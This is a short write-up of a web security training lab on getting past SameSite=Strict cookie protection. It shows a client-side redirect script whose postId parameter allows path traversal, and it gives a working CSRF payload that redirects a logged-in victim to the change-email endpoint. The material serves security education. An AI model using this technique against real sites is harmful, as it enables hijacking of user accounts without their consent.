Title: SameSite Strict bypass via client-side redirect
Level: PRACTITIONER
Desc:  This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.
You can log in to your own account using the following credentials: wiener:peter 

# Walkthrough:
Now we have Samesite: Strict set on the cookie.
<img width="1462" height="80" alt="image" src="https://github.com/user-attachments/assets/ddcec993-b27a-4fbe-8c0d-0b76e569cc61" />

After adding a comment I get redirection to https://0a6b00030321b2b880e9037100e3000a.web-security-academy.net/post/comment/confirmation?postId=9

After redirection I can see, that below js file is being requested.
https://0a6b00030321b2b880e9037100e3000a.web-security-academy.net/resources/js/commentConfirmationRedirect.js

The script takes parameter postId from the url to make redirection.
```
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```
I am crafting url like that: `https://0a6b00030321b2b880e9037100e3000a.web-security-academy.net/post/comment/confirmation?postId=../../my-account`

So now I can craft an exploit:
```
<script>
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
</script>
```
It makes request to the same site, but it makes also redirect using site functionallity to /my-account/change-email.


